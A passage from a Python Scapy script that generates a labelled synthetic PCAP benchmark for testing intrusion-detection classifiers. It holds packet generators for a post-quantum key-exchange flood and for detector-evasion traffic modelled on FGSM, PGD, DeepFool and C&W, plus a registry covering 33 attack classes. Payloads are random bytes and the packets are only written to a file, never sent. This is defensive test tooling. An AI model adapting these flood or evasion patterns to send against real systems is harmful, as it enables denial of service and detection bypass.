                    Raw(load=os.urandom(1184)))  # Kyber-768 ciphertext
        pkts.append(IP(src=dst, dst=src) / TCP(sport=PQ_KEM_PORT, dport=sport, flags="PA") /
                    Raw(load=os.urandom(random.randint(32, 64))))  # Shared secret response
        sport = (sport + 1) % 65536 or 49152
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.005, 0.02)
    return pkts


def gen_pq_key_exhaustion(base_ts):
    """DoS attack: flood PQ key exchange to exhaust server resources."""
    dst = random.choice(BANKING_SERVERS)
    pkts = []
    for _ in range(random.randint(100, 250)):
        src = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
        # Each sends a large PQ ClientHello (Kyber-1024 encapsulation)
        pkts.append(IP(src=src, dst=dst) / TCP(sport=random.randint(1024, 65535),
                    dport=443, flags="S"))
        pkts.append(IP(src=src, dst=dst) / TCP(sport=random.randint(1024, 65535),
                    dport=443, flags="PA") / Raw(load=os.urandom(1568)))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.00005, 0.001)
    return pkts


# ── Adversarial perturbation flows ───────────────────────────────────────
# These simulate what adversarial ML attacks (FGSM, PGD, etc.) look like
# at the network level: subtly modified traffic patterns.

def gen_adversarial_fgsm(base_ts):
    """FGSM-style: benign-looking flow with single-step perturbation in packet sizes."""
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    # Looks like normal HTTPS but packet sizes are adversarially perturbed
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="S"))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="SA"))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="A"))
    for _ in range(random.randint(5, 12)):
        # Perturbed payload sizes (slightly off from normal distribution)
        perturbed_size = int(random.gauss(700, 50) + random.choice([-127, 127]))  # FGSM epsilon
        perturbed_size = max(10, min(1400, perturbed_size))
        sender, receiver = random.choice([(src, dst), (dst, src)])
        sp, dp = (sport, 443) if sender == src else (443, sport)
        pkts.append(IP(src=sender, dst=receiver) / TCP(sport=sp, dport=dp, flags="PA") /
                    Raw(load=os.urandom(perturbed_size)))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="FA"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.005, 0.05)
    return pkts


def gen_adversarial_pgd(base_ts):
    """PGD-style: iteratively crafted flow with multi-step perturbations."""
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="S"))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="SA"))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="A"))
    # PGD: multiple small perturbation steps
    base_size = 800
    for step in range(random.randint(8, 15)):
        epsilon = random.uniform(0.01, 0.1)
        perturbed = int(base_size * (1 + epsilon * random.choice([-1, 1])))
        perturbed = max(10, min(1400, perturbed))
        # Alternate timing perturbation too
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="PA") /
                    Raw(load=os.urandom(perturbed)))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="PA") /
                    Raw(load=os.urandom(random.randint(200, 600))))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.003, 0.03)
    return pkts


def gen_adversarial_deepfool(base_ts):
    """DeepFool-style: minimal perturbation to cross decision boundary."""
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(ENTERPRISE_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="S"))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="SA"))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="A"))
    # Very subtle changes: almost identical to benign
    for _ in range(random.randint(4, 8)):
        # Minimal perturbation: 1-5 bytes difference from "normal"
        normal_size = random.randint(300, 1200)
        delta = random.randint(1, 5) * random.choice([-1, 1])
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="PA") /
                    Raw(load=os.urandom(max(10, normal_size + delta))))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="PA") /
                    Raw(load=os.urandom(random.randint(200, 800))))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="FA"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.1)
    return pkts


def gen_adversarial_cw(base_ts):
    """C&W-style: optimized perturbation targeting confidence scores."""
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="S"))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="SA"))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="A"))
    # C&W: carefully optimized sizes and timing to minimize detection confidence
    for _ in range(random.randint(6, 12)):
        # Sizes optimized to land in uncertainty region
        size = random.choice([387, 512, 641, 769, 1023])  # Power-of-2 adjacent
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="PA") /
                    Raw(load=os.urandom(size)))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="PA") /
                    Raw(load=os.urandom(random.randint(200, 600))))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="FA"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.08)
    return pkts


# ── Flow generator registry ──────────────────────────────────────────────

GENERATORS = {
    "Benign": [gen_benign, lambda ts: gen_pq_tls_benign(ts, "768"),
               lambda ts: gen_pq_tls_benign(ts, "512"),
               lambda ts: gen_pq_tls_benign(ts, "1024")],
    "DDoS-TCP_Flood": [gen_ddos_tcp_flood, gen_pq_key_exhaustion],
    "DDoS-UDP_Flood": [gen_ddos_udp_flood],
    "DDoS-ICMP_Flood": [gen_ddos_icmp_flood],
    "DDoS-HTTP_Flood": [gen_ddos_http_flood],
    "DDoS-SYN_Flood": [gen_ddos_syn_flood],
    "DDoS-SlowLoris": [gen_ddos_slowloris],
    "DDoS-RSTFIN_Flood": [gen_ddos_rstfin_flood],
    "DDoS-Pshack_Flood": [gen_ddos_pshack_flood],
    "DDoS-ACK_Fragmentation": [gen_ddos_ack_frag],
    "DDoS-UDP_Fragmentation": [gen_ddos_udp_frag],
    "DDoS-ICMP_Fragmentation": [gen_ddos_icmp_frag],
    "Recon-PortScan": [gen_recon_portscan, gen_pq_harvest_now],
    "Recon-OSScan": [gen_recon_osscan],
    "Recon-HostDiscovery": [gen_recon_hostdiscovery],
    "Recon-PingSweep": [gen_recon_pingsweep],
    "BruteForce-SSH": [gen_bruteforce_ssh],
    "BruteForce-FTP": [gen_bruteforce_ftp],
    "BruteForce-HTTP": [gen_bruteforce_http],
    "BruteForce-Dictionary": [gen_bruteforce_dict],
    "Spoofing-ARP": [gen_spoofing_arp],
    "Spoofing-DNS": [gen_spoofing_dns, gen_pq_downgrade],
    "Spoofing-IP": [gen_spoofing_ip],
    "WebAttack-SQLi": [gen_web_sqli],
    "WebAttack-XSS": [gen_web_xss],
    "WebAttack-CommandInjection": [gen_web_cmdinj, gen_pq_side_channel],
    "WebAttack-BrowserHijacking": [gen_web_browserhijack],
    "Malware-Backdoor": [gen_malware_backdoor],
    "Malware-Ransomware": [gen_malware_ransomware],
    "Malware-Trojan": [gen_malware_trojan],
    "DoS-Slowhttptest": [gen_dos_slowhttptest],
    "DoS-Hulk": [gen_dos_hulk],
    "Mirai-greeth_flood": [gen_mirai_greeth],
    "Mirai-greip_flood": [gen_mirai_greip],
}

# Adversarial perturbation flows (added to Benign for evasion testing)
ADVERSARIAL_GENERATORS = {
    "Adversarial-FGSM": gen_adversarial_fgsm,
    "Adversarial-PGD": gen_adversarial_pgd,
    "Adversarial-DeepFool": gen_adversarial_deepfool,
    "Adversarial-CW": gen_adversarial_cw,
}


def generate_pcap(n_flows: int = 3000, output: str = "adversarial_benchmark.pcap"):
    """Generate the comprehensive adversarial benchmark PCAP."""
    all_packets = []
    flow_counts = {}

    # Distribution: 30% benign, 50% attacks (across 33 classes), 20% adversarial
    n_benign = int(n_flows * 0.30)
    n_attack = int(n_flows * 0.50)
    n_adversarial = n_flows - n_benign - n_attack

    # Flows per attack class (roughly equal)
    n_attack_classes = len(CLASS_NAMES) - 1  # exclude Benign
    flows_per_class = max(2, n_attack // n_attack_classes)

    base_ts = 1700000000.0  # Starting timestamp

    print(f"Generating {n_flows} flows...")

    # 1. Benign flows (mix of normal + PQ-TLS)
    print(f"  Benign flows: {n_benign}")
    for _ in range(n_benign):
        gen = random.choice(GENERATORS["Benign"])
        pkts = gen(base_ts)
        all_packets.extend(pkts)
        base_ts += random.uniform(0.1, 2.0)
        flow_counts["Benign"] = flow_counts.get("Benign", 0) + 1

    # 2. Attack flows (all 33 classes)
    for cls in CLASS_NAMES[1:]:
        gens = GENERATORS.get(cls, [])
        if not gens:
            continue
        n_cls = flows_per_class + random.randint(-1, 2)
        print(f"  {cls}: {n_cls} flows")
        for _ in range(n_cls):
            gen = random.choice(gens)
            pkts = gen(base_ts)
            all_packets.extend(pkts)
            base_ts += random.uniform(0.05, 1.0)
            flow_counts[cls] = flow_counts.get(cls, 0) + 1

    # 3. Adversarial perturbation flows
    adv_per_type = max(2, n_adversarial // len(ADVERSARIAL_GENERATORS))
    for adv_name, gen in ADVERSARIAL_GENERATORS.items():
        print(f"  {adv_name}: {adv_per_type} flows")
        for _ in range(adv_per_type):
            pkts = gen(base_ts)
            all_packets.extend(pkts)
            base_ts += random.uniform(0.1, 1.0)
            flow_counts[adv_name] = flow_counts.get(adv_name, 0) + 1

    # Sort by timestamp
    all_packets.sort(key=lambda p: float(p.time))

    # Write PCAP
    print(f"\nWriting {len(all_packets)} packets to {output}...")
    wrpcap(output, all_packets)

    # Stats
    file_size = os.path.getsize(output)
    print(f"\n{'=' * 60}")
    print(f"Adversarial Benchmark PCAP Generated")
    print(f"{'=' * 60}")
    print(f"  File:     {output}")
    print(f"  Size:     {file_size / (1024 * 1024):.2f} MB")
    print(f"  Packets:  {len(all_packets):,}")
    print(f"  Flows:    {sum(flow_counts.values()):,}")
    print(f"\nFlow distribution:")

    total = sum(flow_counts.values())
    # Group by category
    categories = {
        "Benign (normal + PQ-TLS)": ["Benign"],
        "DDoS variants": [c for c in flow_counts if c.startswith("DDoS")],
        "Reconnaissance": [c for c in flow_counts if c.startswith("Recon")],
        "Brute Force": [c for c in flow_counts if c.startswith("BruteForce")],
        "Spoofing": [c for c in flow_counts if c.startswith("Spoofing")],
        "Web Attacks": [c for c in flow_counts if c.startswith("WebAttack")],
        "Malware": [c for c in flow_counts if c.startswith("Malware")],
        "DoS": [c for c in flow_counts if c.startswith("DoS")],
        "Mirai": [c for c in flow_counts if c.startswith("Mirai")],
        "Adversarial ML": [c for c in flow_counts if c.startswith("Adversarial")],
    }

    for cat_name, classes in categories.items():
        cat_total = sum(flow_counts.get(c, 0) for c in classes)
        if cat_total == 0:
            continue
        print(f"\n  {cat_name}: {cat_total} ({cat_total/total*100:.1f}%)")
        for c in sorted(classes):
            if c in flow_counts:
                print(f"    {c}: {flow_counts[c]}")

    print(f"\n  Total classes: {len([c for c in flow_counts if not c.startswith('Adversarial')])}/34")
    print(f"  + {len(ADVERSARIAL_GENERATORS)} adversarial perturbation types (FGSM, PGD, DeepFool, C&W)")
    print(f"\nTarget services:")
    print(f"  Banking:    10.100.x.x (ports 443, 8443, 9443)")
    print(f"  Government: 10.200.x.x (ports 443, 8080, 636)")
    print(f"  Enterprise: 10.50.x.x  (general services)")
    print(f"  IoT:        172.16.x.x (compromised devices)")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate adversarial benchmark PCAP")
    parser.add_argument("--flows", type=int, default=3000,
                        help="Total number of flows (default: 3000, ~8-10 MB)")
    parser.add_argument("--output", type=str, default="adversarial_benchmark.pcap",
                        help="Output PCAP filename")
    args = parser.parse_args()

    generate_pcap(n_flows=args.flows, output=args.output)
